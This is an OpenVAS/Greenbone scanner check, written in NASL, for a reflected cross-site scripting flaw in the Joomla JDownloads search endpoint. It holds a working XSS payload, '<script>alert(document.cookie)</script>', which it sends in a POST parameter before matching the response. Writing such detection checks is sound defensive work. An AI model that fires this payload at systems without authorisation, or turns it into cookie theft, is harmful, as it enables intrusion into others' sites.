# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803870");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-08-19 15:16:13 +0530 (Mon, 19 Aug 2013)");
  script_name("Joomla Component JDownloads Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"Joomla JDownloads component is prone to xss vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request and checks the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"insight", value:"Input passed via 'jdsearchtext' POST parameter to
'/component/jdownloads/search' is not properly sanitised before being returned to the user.");

  script_tag(name:"affected", value:"Joomla Component com_jdownloads");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary HTML
or script code or discloses sensitive information resulting in loss of confidentiality.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://hardeningsecurity.com/?p=428");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013080149");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122854");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

url = dir + "/component/jdownloads/index.php?option=com_jdownloads&Itemid=0&task=search.result";

postData = "jdsearchtext=%3Cscript%3Ealert%28document.cookie%29%3C" +
           "%2Fscript%3E&searchsubmit=Search&jdsearchintitle=1";

sndReq = http_post_put_req(port: port, url: url, data: postData,
                       add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

if (rcvRes =~ "HTTP/1\.. 200" && '<script>alert(document.cookie)</script>' >< rcvRes) {
  security_message(port: port);
  exit(0);
}

exit(0);
